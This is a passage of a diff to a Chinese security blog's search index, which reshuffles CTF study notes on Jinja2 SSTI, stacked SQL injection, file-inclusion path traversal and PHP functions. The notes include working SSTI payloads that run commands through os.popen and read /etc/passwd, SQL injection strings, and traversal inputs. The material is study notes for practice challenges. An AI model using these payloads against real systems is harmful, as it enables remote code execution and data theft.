class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SSTI </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>gopher_协议使用</title>
       <link href="/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
       <url>/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</url>
@@ -479,36 +554,11 @@
     
     
     <entry>
-      <title>SQL堆叠注入</title>
-      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      <title>php函数简记</title>
+      <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
+      <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
       
-        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SSTI简记</title>
-      <link href="/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
-      <url>/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -520,7 +570,7 @@
       
         <tags>
             
-            <tag> SSTI </tag>
+            <tag> PHP </tag>
             
         </tags>
       
@@ -554,11 +604,11 @@
     
     
     <entry>
-      <title>php函数简记</title>
-      <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
-      <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
+      <title>文件包含漏洞</title>
+      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
       
-        <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
       
       
       <categories>
@@ -596,31 +646,6 @@
         <tags>
             
             <tag> SQL绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文件包含漏洞</title>
-      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
-      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-      
-        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
             
         </tags>
       
